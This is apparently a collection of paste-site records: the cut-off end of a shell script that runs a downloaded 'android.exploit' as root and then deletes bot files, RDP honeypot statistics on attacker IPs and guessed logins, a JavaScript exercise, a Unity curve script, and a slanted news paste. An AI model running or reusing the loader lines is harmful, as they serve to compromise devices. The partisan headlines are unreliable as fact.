su 0 /data/local/tmp/$file_name android.exploit
# Kiểm tra và thông báo kết quả
if [ $? -eq 0 ]; then
  echo ""Tệp tin đã được tải thành công: $file_name""
else
  echo ""Đã xảy ra lỗi trong quá trình tải tệp tin.""
fi
rm -rf bot*
rm -rf a
"
gTtMTn2U,2024-04-05_stats.json,rdp_snitch,JSON,Friday 5th of April 2024 07:18:15 PM CDT,"{
  ""ip"": {
    ""80.94.95.121"": 6,
    ""58.218.204.183"": 9,
    ""142.202.136.244"": 3,
    ""84.17.46.173"": 3,
    ""45.227.254.26"": 6,
    ""198.235.24.193"": 9,
    ""45.227.254.9"": 9,
    ""194.165.16.73"": 6,
    ""185.170.144.3"": 6,
    ""185.198.69.20"": 6,
    ""212.41.9.9"": 9,
    ""185.198.69.18"": 12,
    ""185.198.69.11"": 12,
    ""185.198.69.28"": 12,
    ""185.198.69.12"": 9,
    ""185.198.69.4"": 9,
    ""185.198.69.2"": 12,
    ""185.198.69.30"": 9,
    ""198.135.49.131"": 12,
    ""185.198.69.6"": 18,
    ""185.198.69.10"": 6,
    ""185.198.69.22"": 6,
    ""185.161.248.148"": 3,
    ""81.19.135.2"": 18,
    ""185.198.69.19"": 9,
    ""185.198.69.14"": 15,
    ""185.198.69.8"": 21,
    ""128.14.237.9"": 3,
    ""185.198.69.3"": 6,
    ""205.210.31.98"": 9,
    ""87.251.75.145"": 9,
    ""152.89.198.238"": 6,
    ""116.140.196.215"": 3,
    ""185.198.69.24"": 12,
    ""185.198.69.27"": 6,
    ""185.198.69.29"": 12,
    ""185.198.69.17"": 9,
    ""185.198.69.21"": 9,
    ""185.198.69.5"": 6,
    ""196.190.117.7"": 6,
    ""185.198.69.25"": 6,
    ""185.198.69.16"": 9,
    ""185.198.69.26"": 6,
    ""147.78.47.97"": 3,
    ""185.198.69.15"": 3,
    ""185.198.69.9"": 3,
    ""51.68.192.120"": 6,
    ""185.198.69.7"": 3,
    ""91.238.181.16"": 6,
    ""185.198.69.23"": 9,
    ""92.205.232.248"": 6,
    ""185.198.69.31"": 3,
    ""45.227.254.54"": 6,
    ""62.204.41.222"": 6,
    ""212.70.149.146"": 3,
    ""198.235.24.2"": 9,
    ""13.229.231.143"": 3,
    ""118.194.250.2"": 3,
    ""185.198.69.13"": 3,
    ""52.149.219.213"": 3,
    ""39.105.102.119"": 3,
    ""80.94.95.123"": 12,
    ""103.20.97.235"": 6,
    ""80.94.95.119"": 3,
    ""179.60.150.59"": 3,
    ""113.160.91.206"": 3,
    ""160.251.216.209"": 3,
    ""81.19.135.47"": 9,
    ""81.21.8.57"": 3,
    ""185.73.125.86"": 3,
    ""198.235.24.42"": 9,
    ""128.199.225.179"": 888
  },
  ""asn"": {
    ""AS204428"": 24,
    ""AS4134"": 9,
    ""AS52284"": 3,
    ""AS60068"": 3,
    ""AS267784"": 21,
    ""AS396982"": 36,
    ""AS48721"": 6,
    ""AS197414"": 6,
    ""AS57523"": 267,
    ""AS49505"": 9,
    ""AS396073"": 12,
    ""AS49202"": 3,
    ""AS209588"": 30,
    ""AS135377"": 6,
    ""AS208091"": 12,
    ""AS4837"": 3,
    ""AS24757"": 6,
    ""AS16276"": 6,
    ""AS49434"": 6,
    ""AS21499"": 6,
    ""AS59425"": 6,
    ""AS16509"": 3,
    ""AS8075"": 3,
    ""AS37963"": 3,
    ""AS150880"": 6,
    ""AS211179"": 3,
    ""AS45899"": 3,
    ""AS58791"": 3,
    ""AS44486"": 3,
    ""AS14061"": 888
  },
  ""isp"": {
    ""SS-Net"": 24,
    ""Chinanet"": 9,
    ""Panamaserver.com"": 3,
    ""DataCamp Limited"": 3,
    ""Flyservers S.A."": 57,
    ""Google LLC"": 36,
    ""Xhost Internet Solutions LP"": 18,
    ""Chang Way Technologies Co. Limited"": 267,
    ""OOO \""Network of data-centers \""Selectel\"""": 9,
    ""Majestic Hosting Solutions, LLC"": 12,
    ""Kisara LLC"": 3,
    ""Zenlayer Inc"": 3,
    ""China Unicom CHINA169 Network"": 3,
    ""Ethiotelecom"": 6,
    ""OVH SAS"": 6,
    ""Datacenter location PAR1 France"": 6,
    ""Host Europe GmbH"": 6,
    ""Horizon LLC"": 6,
    ""Amazon Technologies Inc."": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Microsoft Corporation"": 3,
    ""Hangzhou Alibaba Advertising Co"": 3,
    ""Fast Byte Fast Data Company Limited"": 6,
    ""Veraton Projects LTD"": 3,
    ""VietNam Post and Telecom Corporation"": 3,
    ""GMO Internet Group, Inc."": 3,
    ""Oliver Horscht is trading as \""SYNLINQ\"""": 3,
    ""DigitalOcean, LLC"": 888
  },
  ""org"": {
    ""Unmanaged LTD"": 21,
    ""Chinanet JS"": 9,
    ""EXA Solutions"": 3,
    ""Cdn77 AMS"": 3,
    ""UAB Host Baltic"": 21,
    ""Palo Alto Networks, Inc"": 36,
    ""Flyservers S.A"": 9,
    ""Xhostis"": 9,
    ""Chang Way Technologies Co. Limited"": 261,
    ""Unknown"": 24,
    ""Majestic Hosting Solutions, LLC"": 12,
    ""Kisara LLC"": 3,
    ""Alviva Holding Limited"": 27,
    ""UCLOUD"": 3,
    ""Xhost Internet Solutions"": 9,
    ""Starcrecium Limited"": 6,
    ""China United Network Communications Corporation Limited"": 3,
    ""OVH Ltd"": 6,
    ""ThinkTech Technology Industrial CO. Limited"": 6,
    ""Horizon LLC"": 6,
    ""4Media Ltd"": 3,
    ""AWS EC2 (ap-southeast-1)"": 3,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""Microsoft Azure Cloud (eastus)"": 3,
    ""Aliyun Computing Co., LTD"": 3,
    ""FASTBYTE"": 6,
    ""Maxwell Group LTD"": 3,
    ""Vietnam Posts and Telecommunications Group"": 3,
    ""interQ"": 3,
    ""DigitalOcean, LLC"": 888
  },
  ""regionName"": {
    ""Budapest"": 21,
    ""Jiangsu"": 9,
    ""Delaware"": 3,
    ""North Holland"": 24,
    ""Vilnius"": 21,
    ""California"": 36,
    ""Kaunas"": 6,
    ""Moscow"": 285,
    ""Texas"": 12,
    ""Hesse"": 27,
    ""Taiwan"": 3,
    ""Beijing"": 6,
    ""Addis Ababa"": 6,
    ""England"": 6,
    ""\u00cele-de-France"": 6,
    ""Grand Est"": 6,
    ""Sliven"": 3,
    ""Central Singapore"": 891,
    ""Bangkok"": 3,
    ""Virginia"": 3,
    ""Ho Chi Minh"": 6,
    ""Distrito Federal"": 3,
    ""Hanoi"": 3,
    ""Tokyo"": 3,
    ""Riyadh Region"": 3
  },
  ""country"": {
    ""Hungary"": 21,
    ""China"": 15,
    ""United States"": 54,
    ""The Netherlands"": 24,
    ""Lithuania"": 27,
    ""Russia"": 285,
    ""Germany"": 27,
    ""Taiwan"": 3,
    ""Ethiopia"": 6,
    ""United Kingdom"": 6,
    ""France"": 12,
    ""Bulgaria"": 3,
    ""Singapore"": 891,
    ""Thailand"": 3,
    ""Vietnam"": 9,
    ""Venezuela"": 3,
    ""Japan"": 3,
    ""Saudi Arabia"": 3
  },
  ""account"": {
    ""Administr"": 306,
    ""hello"": 57,
    ""Test"": 51,
    ""muHrHftST"": 3,
    ""sloSGN"": 3,
    ""tcidzK"": 3,
    ""Domain"": 45,
    ""Administrator"": 228,
    ""srohgqWYP"": 3,
    ""QVrINC"": 3,
    ""dAUzxT"": 3,
    ""(empty)"": 6,
    ""PwSMETEgs"": 3,
    ""EZsyTI"": 3,
    ""CpwyTQ"": 3,
    ""uKnwvXEQP"": 3,
    ""wJJpqV"": 3,
    ""hdbHWW"": 3,
    ""Admin"": 222,
    ""Whatuptime.com"": 222,
    ""Jakartakini123#"": 222
  },
  ""keyboard"": {
    ""Unknown"": 1395
  },
  ""client_build"": {
    ""Unknown"": 1395
  },
  ""client_name"": {
    ""Unknown"": 1395
  },
  ""ip_type"": {
    ""Unknown"": 150,
    ""hosting & proxy"": 3,
    ""hosting"": 975,
    ""proxy"": 267
  }
}"
RQp3fwYw,2024-04-05_stats.json,rdp_snitch,JSON,Friday 5th of April 2024 07:16:06 PM CDT,"{
  ""ip"": {
    ""80.94.95.121"": 4,
    ""58.218.204.183"": 6,
    ""142.202.136.244"": 2,
    ""84.17.46.173"": 2,
    ""45.227.254.26"": 4,
    ""198.235.24.193"": 6,
    ""45.227.254.9"": 6,
    ""194.165.16.73"": 4,
    ""185.170.144.3"": 4,
    ""185.198.69.20"": 4,
    ""212.41.9.9"": 6,
    ""185.198.69.18"": 8,
    ""185.198.69.11"": 8,
    ""185.198.69.28"": 8,
    ""185.198.69.12"": 6,
    ""185.198.69.4"": 6,
    ""185.198.69.2"": 8,
    ""185.198.69.30"": 6,
    ""198.135.49.131"": 8,
    ""185.198.69.6"": 12,
    ""185.198.69.10"": 4,
    ""185.198.69.22"": 4,
    ""185.161.248.148"": 2,
    ""81.19.135.2"": 12,
    ""185.198.69.19"": 6,
    ""185.198.69.14"": 10,
    ""185.198.69.8"": 14,
    ""128.14.237.9"": 2,
    ""185.198.69.3"": 4,
    ""205.210.31.98"": 6,
    ""87.251.75.145"": 6,
    ""152.89.198.238"": 4,
    ""116.140.196.215"": 2,
    ""185.198.69.24"": 8,
    ""185.198.69.27"": 4,
    ""185.198.69.29"": 8,
    ""185.198.69.17"": 6,
    ""185.198.69.21"": 6,
    ""185.198.69.5"": 4,
    ""196.190.117.7"": 4,
    ""185.198.69.25"": 4,
    ""185.198.69.16"": 6,
    ""185.198.69.26"": 4,
    ""147.78.47.97"": 2,
    ""185.198.69.15"": 2,
    ""185.198.69.9"": 2,
    ""51.68.192.120"": 4,
    ""185.198.69.7"": 2,
    ""91.238.181.16"": 4,
    ""185.198.69.23"": 6,
    ""92.205.232.248"": 4,
    ""185.198.69.31"": 2,
    ""45.227.254.54"": 4,
    ""62.204.41.222"": 4,
    ""212.70.149.146"": 2,
    ""198.235.24.2"": 6,
    ""13.229.231.143"": 2,
    ""118.194.250.2"": 2,
    ""185.198.69.13"": 2,
    ""52.149.219.213"": 2,
    ""39.105.102.119"": 2,
    ""80.94.95.123"": 8,
    ""103.20.97.235"": 4,
    ""80.94.95.119"": 2,
    ""179.60.150.59"": 2,
    ""113.160.91.206"": 2,
    ""160.251.216.209"": 2,
    ""81.19.135.47"": 6,
    ""81.21.8.57"": 2,
    ""185.73.125.86"": 2,
    ""198.235.24.42"": 6,
    ""128.199.225.179"": 592
  },
  ""asn"": {
    ""AS204428"": 16,
    ""AS4134"": 6,
    ""AS52284"": 2,
    ""AS60068"": 2,
    ""AS267784"": 14,
    ""AS396982"": 24,
    ""AS48721"": 4,
    ""AS197414"": 4,
    ""AS57523"": 178,
    ""AS49505"": 6,
    ""AS396073"": 8,
    ""AS49202"": 2,
    ""AS209588"": 20,
    ""AS135377"": 4,
    ""AS208091"": 8,
    ""AS4837"": 2,
    ""AS24757"": 4,
    ""AS16276"": 4,
    ""AS49434"": 4,
    ""AS21499"": 4,
    ""AS59425"": 4,
    ""AS16509"": 2,
    ""AS8075"": 2,
    ""AS37963"": 2,
    ""AS150880"": 4,
    ""AS211179"": 2,
    ""AS45899"": 2,
    ""AS58791"": 2,
    ""AS44486"": 2,
    ""AS14061"": 592
  },
  ""isp"": {
    ""SS-Net"": 16,
    ""Chinanet"": 6,
    ""Panamaserver.com"": 2,
    ""DataCamp Limited"": 2,
    ""Flyservers S.A."": 38,
    ""Google LLC"": 24,
    ""Xhost Internet Solutions LP"": 12,
    ""Chang Way Technologies Co. Limited"": 178,
    ""OOO \""Network of data-centers \""Selectel\"""": 6,
    ""Majestic Hosting Solutions, LLC"": 8,
    ""Kisara LLC"": 2,
    ""Zenlayer Inc"": 2,
    ""China Unicom CHINA169 Network"": 2,
    ""Ethiotelecom"": 4,
    ""OVH SAS"": 4,
    ""Datacenter location PAR1 France"": 4,
    ""Host Europe GmbH"": 4,
    ""Horizon LLC"": 4,
    ""Amazon Technologies Inc."": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Microsoft Corporation"": 2,
    ""Hangzhou Alibaba Advertising Co"": 2,
    ""Fast Byte Fast Data Company Limited"": 4,
    ""Veraton Projects LTD"": 2,
    ""VietNam Post and Telecom Corporation"": 2,
    ""GMO Internet Group, Inc."": 2,
    ""Oliver Horscht is trading as \""SYNLINQ\"""": 2,
    ""DigitalOcean, LLC"": 592
  },
  ""org"": {
    ""Unmanaged LTD"": 14,
    ""Chinanet JS"": 6,
    ""EXA Solutions"": 2,
    ""Cdn77 AMS"": 2,
    ""UAB Host Baltic"": 14,
    ""Palo Alto Networks, Inc"": 24,
    ""Flyservers S.A"": 6,
    ""Xhostis"": 6,
    ""Chang Way Technologies Co. Limited"": 174,
    ""Unknown"": 16,
    ""Majestic Hosting Solutions, LLC"": 8,
    ""Kisara LLC"": 2,
    ""Alviva Holding Limited"": 18,
    ""UCLOUD"": 2,
    ""Xhost Internet Solutions"": 6,
    ""Starcrecium Limited"": 4,
    ""China United Network Communications Corporation Limited"": 2,
    ""OVH Ltd"": 4,
    ""ThinkTech Technology Industrial CO. Limited"": 4,
    ""Horizon LLC"": 4,
    ""4Media Ltd"": 2,
    ""AWS EC2 (ap-southeast-1)"": 2,
    ""Ucloud Information Technology (hk) Limited"": 2,
    ""Microsoft Azure Cloud (eastus)"": 2,
    ""Aliyun Computing Co., LTD"": 2,
    ""FASTBYTE"": 4,
    ""Maxwell Group LTD"": 2,
    ""Vietnam Posts and Telecommunications Group"": 2,
    ""interQ"": 2,
    ""DigitalOcean, LLC"": 592
  },
  ""regionName"": {
    ""Budapest"": 14,
    ""Jiangsu"": 6,
    ""Delaware"": 2,
    ""North Holland"": 16,
    ""Vilnius"": 14,
    ""California"": 24,
    ""Kaunas"": 4,
    ""Moscow"": 190,
    ""Texas"": 8,
    ""Hesse"": 18,
    ""Taiwan"": 2,
    ""Beijing"": 4,
    ""Addis Ababa"": 4,
    ""England"": 4,
    ""\u00cele-de-France"": 4,
    ""Grand Est"": 4,
    ""Sliven"": 2,
    ""Central Singapore"": 594,
    ""Bangkok"": 2,
    ""Virginia"": 2,
    ""Ho Chi Minh"": 4,
    ""Distrito Federal"": 2,
    ""Hanoi"": 2,
    ""Tokyo"": 2,
    ""Riyadh Region"": 2
  },
  ""country"": {
    ""Hungary"": 14,
    ""China"": 10,
    ""United States"": 36,
    ""The Netherlands"": 16,
    ""Lithuania"": 18,
    ""Russia"": 190,
    ""Germany"": 18,
    ""Taiwan"": 2,
    ""Ethiopia"": 4,
    ""United Kingdom"": 4,
    ""France"": 8,
    ""Bulgaria"": 2,
    ""Singapore"": 594,
    ""Thailand"": 2,
    ""Vietnam"": 6,
    ""Venezuela"": 2,
    ""Japan"": 2,
    ""Saudi Arabia"": 2
  },
  ""account"": {
    ""Administr"": 204,
    ""hello"": 38,
    ""Test"": 34,
    ""muHrHftST"": 2,
    ""sloSGN"": 2,
    ""tcidzK"": 2,
    ""Domain"": 30,
    ""Administrator"": 152,
    ""srohgqWYP"": 2,
    ""QVrINC"": 2,
    ""dAUzxT"": 2,
    ""(empty)"": 4,
    ""PwSMETEgs"": 2,
    ""EZsyTI"": 2,
    ""CpwyTQ"": 2,
    ""uKnwvXEQP"": 2,
    ""wJJpqV"": 2,
    ""hdbHWW"": 2,
    ""Admin"": 148,
    ""Whatuptime.com"": 148,
    ""Jakartakini123#"": 148
  },
  ""keyboard"": {
    ""Unknown"": 930
  },
  ""client_build"": {
    ""Unknown"": 930
  },
  ""client_name"": {
    ""Unknown"": 930
  },
  ""ip_type"": {
    ""Unknown"": 100,
    ""hosting & proxy"": 2,
    ""hosting"": 650,
    ""proxy"": 178
  }
}"
ymrgWr7W,2024-04-05_stats.json,rdp_snitch,JSON,Friday 5th of April 2024 07:15:09 PM CDT,"{
  ""ip"": {
    ""80.94.95.121"": 2,
    ""58.218.204.183"": 3,
    ""142.202.136.244"": 1,
    ""84.17.46.173"": 1,
    ""45.227.254.26"": 2,
    ""198.235.24.193"": 3,
    ""45.227.254.9"": 3,
    ""194.165.16.73"": 2,
    ""185.170.144.3"": 2,
    ""185.198.69.20"": 2,
    ""212.41.9.9"": 3,
    ""185.198.69.18"": 4,
    ""185.198.69.11"": 4,
    ""185.198.69.28"": 4,
    ""185.198.69.12"": 3,
    ""185.198.69.4"": 3,
    ""185.198.69.2"": 4,
    ""185.198.69.30"": 3,
    ""198.135.49.131"": 4,
    ""185.198.69.6"": 6,
    ""185.198.69.10"": 2,
    ""185.198.69.22"": 2,
    ""185.161.248.148"": 1,
    ""81.19.135.2"": 6,
    ""185.198.69.19"": 3,
    ""185.198.69.14"": 5,
    ""185.198.69.8"": 7,
    ""128.14.237.9"": 1,
    ""185.198.69.3"": 2,
    ""205.210.31.98"": 3,
    ""87.251.75.145"": 3,
    ""152.89.198.238"": 2,
    ""116.140.196.215"": 1,
    ""185.198.69.24"": 4,
    ""185.198.69.27"": 2,
    ""185.198.69.29"": 4,
    ""185.198.69.17"": 3,
    ""185.198.69.21"": 3,
    ""185.198.69.5"": 2,
    ""196.190.117.7"": 2,
    ""185.198.69.25"": 2,
    ""185.198.69.16"": 3,
    ""185.198.69.26"": 2,
    ""147.78.47.97"": 1,
    ""185.198.69.15"": 1,
    ""185.198.69.9"": 1,
    ""51.68.192.120"": 2,
    ""185.198.69.7"": 1,
    ""91.238.181.16"": 2,
    ""185.198.69.23"": 3,
    ""92.205.232.248"": 2,
    ""185.198.69.31"": 1,
    ""45.227.254.54"": 2,
    ""62.204.41.222"": 2,
    ""212.70.149.146"": 1,
    ""198.235.24.2"": 3,
    ""13.229.231.143"": 1,
    ""118.194.250.2"": 1,
    ""185.198.69.13"": 1,
    ""52.149.219.213"": 1,
    ""39.105.102.119"": 1,
    ""80.94.95.123"": 4,
    ""103.20.97.235"": 2,
    ""80.94.95.119"": 1,
    ""179.60.150.59"": 1,
    ""113.160.91.206"": 1,
    ""160.251.216.209"": 1,
    ""81.19.135.47"": 3,
    ""81.21.8.57"": 1,
    ""185.73.125.86"": 1,
    ""198.235.24.42"": 3,
    ""128.199.225.179"": 296
  },
  ""asn"": {
    ""AS204428"": 8,
    ""AS4134"": 3,
    ""AS52284"": 1,
    ""AS60068"": 1,
    ""AS267784"": 7,
    ""AS396982"": 12,
    ""AS48721"": 2,
    ""AS197414"": 2,
    ""AS57523"": 89,
    ""AS49505"": 3,
    ""AS396073"": 4,
    ""AS49202"": 1,
    ""AS209588"": 10,
    ""AS135377"": 2,
    ""AS208091"": 4,
    ""AS4837"": 1,
    ""AS24757"": 2,
    ""AS16276"": 2,
    ""AS49434"": 2,
    ""AS21499"": 2,
    ""AS59425"": 2,
    ""AS16509"": 1,
    ""AS8075"": 1,
    ""AS37963"": 1,
    ""AS150880"": 2,
    ""AS211179"": 1,
    ""AS45899"": 1,
    ""AS58791"": 1,
    ""AS44486"": 1,
    ""AS14061"": 296
  },
  ""isp"": {
    ""SS-Net"": 8,
    ""Chinanet"": 3,
    ""Panamaserver.com"": 1,
    ""DataCamp Limited"": 1,
    ""Flyservers S.A."": 19,
    ""Google LLC"": 12,
    ""Xhost Internet Solutions LP"": 6,
    ""Chang Way Technologies Co. Limited"": 89,
    ""OOO \""Network of data-centers \""Selectel\"""": 3,
    ""Majestic Hosting Solutions, LLC"": 4,
    ""Kisara LLC"": 1,
    ""Zenlayer Inc"": 1,
    ""China Unicom CHINA169 Network"": 1,
    ""Ethiotelecom"": 2,
    ""OVH SAS"": 2,
    ""Datacenter location PAR1 France"": 2,
    ""Host Europe GmbH"": 2,
    ""Horizon LLC"": 2,
    ""Amazon Technologies Inc."": 1,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Microsoft Corporation"": 1,
    ""Hangzhou Alibaba Advertising Co"": 1,
    ""Fast Byte Fast Data Company Limited"": 2,
    ""Veraton Projects LTD"": 1,
    ""VietNam Post and Telecom Corporation"": 1,
    ""GMO Internet Group, Inc."": 1,
    ""Oliver Horscht is trading as \""SYNLINQ\"""": 1,
    ""DigitalOcean, LLC"": 296
  },
  ""org"": {
    ""Unmanaged LTD"": 7,
    ""Chinanet JS"": 3,
    ""EXA Solutions"": 1,
    ""Cdn77 AMS"": 1,
    ""UAB Host Baltic"": 7,
    ""Palo Alto Networks, Inc"": 12,
    ""Flyservers S.A"": 3,
    ""Xhostis"": 3,
    ""Chang Way Technologies Co. Limited"": 87,
    ""Unknown"": 8,
    ""Majestic Hosting Solutions, LLC"": 4,
    ""Kisara LLC"": 1,
    ""Alviva Holding Limited"": 9,
    ""UCLOUD"": 1,
    ""Xhost Internet Solutions"": 3,
    ""Starcrecium Limited"": 2,
    ""China United Network Communications Corporation Limited"": 1,
    ""OVH Ltd"": 2,
    ""ThinkTech Technology Industrial CO. Limited"": 2,
    ""Horizon LLC"": 2,
    ""4Media Ltd"": 1,
    ""AWS EC2 (ap-southeast-1)"": 1,
    ""Ucloud Information Technology (hk) Limited"": 1,
    ""Microsoft Azure Cloud (eastus)"": 1,
    ""Aliyun Computing Co., LTD"": 1,
    ""FASTBYTE"": 2,
    ""Maxwell Group LTD"": 1,
    ""Vietnam Posts and Telecommunications Group"": 1,
    ""interQ"": 1,
    ""DigitalOcean, LLC"": 296
  },
  ""regionName"": {
    ""Budapest"": 7,
    ""Jiangsu"": 3,
    ""Delaware"": 1,
    ""North Holland"": 8,
    ""Vilnius"": 7,
    ""California"": 12,
    ""Kaunas"": 2,
    ""Moscow"": 95,
    ""Texas"": 4,
    ""Hesse"": 9,
    ""Taiwan"": 1,
    ""Beijing"": 2,
    ""Addis Ababa"": 2,
    ""England"": 2,
    ""\u00cele-de-France"": 2,
    ""Grand Est"": 2,
    ""Sliven"": 1,
    ""Central Singapore"": 297,
    ""Bangkok"": 1,
    ""Virginia"": 1,
    ""Ho Chi Minh"": 2,
    ""Distrito Federal"": 1,
    ""Hanoi"": 1,
    ""Tokyo"": 1,
    ""Riyadh Region"": 1
  },
  ""country"": {
    ""Hungary"": 7,
    ""China"": 5,
    ""United States"": 18,
    ""The Netherlands"": 8,
    ""Lithuania"": 9,
    ""Russia"": 95,
    ""Germany"": 9,
    ""Taiwan"": 1,
    ""Ethiopia"": 2,
    ""United Kingdom"": 2,
    ""France"": 4,
    ""Bulgaria"": 1,
    ""Singapore"": 297,
    ""Thailand"": 1,
    ""Vietnam"": 3,
    ""Venezuela"": 1,
    ""Japan"": 1,
    ""Saudi Arabia"": 1
  },
  ""account"": {
    ""Administr"": 102,
    ""hello"": 19,
    ""Test"": 17,
    ""muHrHftST"": 1,
    ""sloSGN"": 1,
    ""tcidzK"": 1,
    ""Domain"": 15,
    ""Administrator"": 76,
    ""srohgqWYP"": 1,
    ""QVrINC"": 1,
    ""dAUzxT"": 1,
    ""(empty)"": 2,
    ""PwSMETEgs"": 1,
    ""EZsyTI"": 1,
    ""CpwyTQ"": 1,
    ""uKnwvXEQP"": 1,
    ""wJJpqV"": 1,
    ""hdbHWW"": 1,
    ""Admin"": 74,
    ""Whatuptime.com"": 74,
    ""Jakartakini123#"": 74
  },
  ""keyboard"": {
    ""Unknown"": 465
  },
  ""client_build"": {
    ""Unknown"": 465
  },
  ""client_name"": {
    ""Unknown"": 465
  },
  ""ip_type"": {
    ""Unknown"": 50,
    ""hosting & proxy"": 1,
    ""hosting"": 325,
    ""proxy"": 89
  }
}"
iYDSUCHe,HellsKitchen,Silviya7,JavaScript,Friday 5th of April 2024 06:35:24 PM CDT,"
   function onClick () {
      
      let Arr1=[];
      txtArea=JSON.parse(document.querySelector('body textarea').value);
      let ArrAllReastourants=[];
     
      for (const restourant1 of txtArea) {
         
         const [reastourant,works]=restourant1.split(' - ');

         let countw=0;
         let sumsalary=0;
         let workers={};
          //workers=workers.trim();
         for (const w of works.split(',')) {
            const [worker, salary]= w.trim().split(' ');
            workers[worker]=salary;
            countw++;
            sumsalary +=Number(salary);
         }

         let avgsalary=sumsalary/countw;
         let objRestourant=
         {name:reastourant, workersall:workers, txtavgsalary:avgsalary.toFixed(2)};
         ArrAllReastourants.push(objRestourant);

        
      }
      let maxavgsal=0;
      for (const restourant3 of ArrAllReastourants) {
         if(restourant3.txtavgsalary > maxavgsal){
         maxavgsal= restourant3.txtavgsalary ;
         }
      }

      let BestRestourant= ArrAllReastourants.find(r=> r.txtavgsalary==maxavgsal);
      let BestMaxSalary=0;
      /*for (let w3 in BestRestourant.workersall) {
       
         let currentw=BestRestourant.workersall;
         let t=currentw[w3];
      }*/

      let currentw=BestRestourant.workersall;
      let sortedworkers=Object.entries(currentw);
      sortedworkers.sort((a,b)=> b[1]-a[1]);
      for (const [key,value] of sortedworkers) {
         if(Number(value) > BestMaxSalary){
            BestMaxSalary=Number(value).toFixed(2);
         }
      }

    let resrContent=document.querySelector('#bestRestaurant p');
    let rest=`Name: ${BestRestourant.name} Average Salary: ${BestRestourant.txtavgsalary} Best Salary: ${BestMaxSalary}`;
    resrContent.textContent=rest.trim();

    let workersres='';
    
    let resrContentw=document.querySelector('#workers p');
    for (const [key,value] of sortedworkers) {
      workersres+=` Name: ${key} With Salary: ${value}`;
   }
   resrContentw.textContent=workersres.trim();
   
   }"
AuxAMHmj,Curve Drawer betwen 2 points,Arconteus,C#,Friday 5th of April 2024 06:24:06 PM CDT,"using System.Collections.Generic;
using UnityEngine;

public class TransitionDrawer : MonoBehaviour
{
    [Header(""Game Objects"")]
    public GameObject StartPoint;
    public GameObject EndPoint;
    public LineRenderer linerenderer;
    [Header(""Parameters"")]
    public Color lineColor;
    public float lineWidth = 0.02f;
    public int resolution = 12;
    public float Height = 2;
    private void Awake()
    {
        linerenderer = GetComponent<LineRenderer>();
    }
    void Start()
    {
        Configuration();
    }

    // Update is called once per frame
    void Update()
    {
        DrawTransition();
    }


    public Vector3 getHeightPoint()
    {
        Vector3 PointA = StartPoint.transform.position;
        Vector3 PointB = EndPoint.transform.position;
        Vector3 output = (PointA+PointB)/2;
        float oppositeLeg = PointB.y-PointA.y;
        float adjacentLeg = PointB.x-PointA.x;
        float angle = Mathf.Atan2(oppositeLeg, adjacentLeg)+(Mathf.PI/2);
        Vector3 AuxiliarVector = new Vector3(Height*Mathf.Cos(angle), Height*Mathf.Sin(angle));
        output += AuxiliarVector;
        return output;
    }
    public void DrawTransition()
    {
        if (StartPoint == null) return;
        if (EndPoint == null) return;
        Vector3 PA = StartPoint.transform.position;
        Vector3 PB = getHeightPoint();
        Vector3 PC = EndPoint.transform.position;
        List<Vector3> Curve = new List<Vector3>();
        float tick = 1/(float)resolution;
        for(float iteration = 0; iteration <= 1; iteration+= tick)
        {
            Vector3 PAB = Vector3.Lerp(PA, PB, iteration);
            Vector3 PBC = Vector3.Lerp(PB, PC, iteration);
            Vector3 Point = Vector3.Lerp(PAB,PBC, iteration);
            Curve.Add(Point);
        }
        linerenderer.positionCount = Curve.Count;
        linerenderer.SetPositions(Curve.ToArray());
    }

    public void Configuration()
    {
        linerenderer.startColor = lineColor;
        linerenderer.endColor = lineColor;
        linerenderer.startWidth = lineWidth;
        linerenderer.endWidth = lineWidth;
    }
}"
S356SXXX,News April5 24,Newscaster_Ned,Email,Friday 5th of April 2024 05:58:08 PM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎

O‎n‎c‎e‎ ‎a‎g‎a‎i‎n‎,‎ ‎I‎ ‎j‎o‎i‎n‎ ‎y‎o‎u‎ ‎c‎r‎a‎c‎k‎e‎r‎s‎ ‎h‎e‎r‎e‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎n‎e‎w‎s‎.‎

B‎i‎d‎e‎n‎ ‎R‎e‎p‎e‎a‎t‎s‎ ‎D‎e‎b‎u‎n‎k‎e‎d‎ ‎L‎i‎e‎ ‎t‎h‎a‎t‎ ‎H‎e‎ ‎T‎r‎a‎v‎e‎l‎e‎d‎ ‎w‎i‎t‎h‎ ‎X‎i‎ ‎1‎7‎,‎0‎0‎0‎ ‎M‎i‎l‎e‎s‎ ‎i‎n‎ ‎T‎i‎b‎e‎t‎
R‎o‎b‎e‎r‎t‎ ‎F‎.‎ ‎K‎e‎n‎n‎e‎d‎y‎ ‎J‎r‎.‎ ‎U‎n‎d‎e‎r‎c‎u‎t‎s‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎ ‎A‎r‎g‎u‎m‎e‎n‎t‎ ‎o‎n‎ ‎J‎a‎n‎.‎ ‎6‎ ‎'‎I‎n‎s‎u‎r‎r‎e‎c‎t‎i‎o‎n‎'‎
W‎a‎t‎c‎h‎:‎ ‎T‎r‎a‎n‎s‎g‎e‎n‎d‎e‎r‎ ‎S‎e‎x‎u‎a‎l‎ ‎D‎i‎s‎p‎l‎a‎y‎ ‎b‎y‎ ‎C‎o‎u‎r‎t‎h‎o‎u‎s‎e‎ ‎L‎a‎w‎y‎e‎r‎
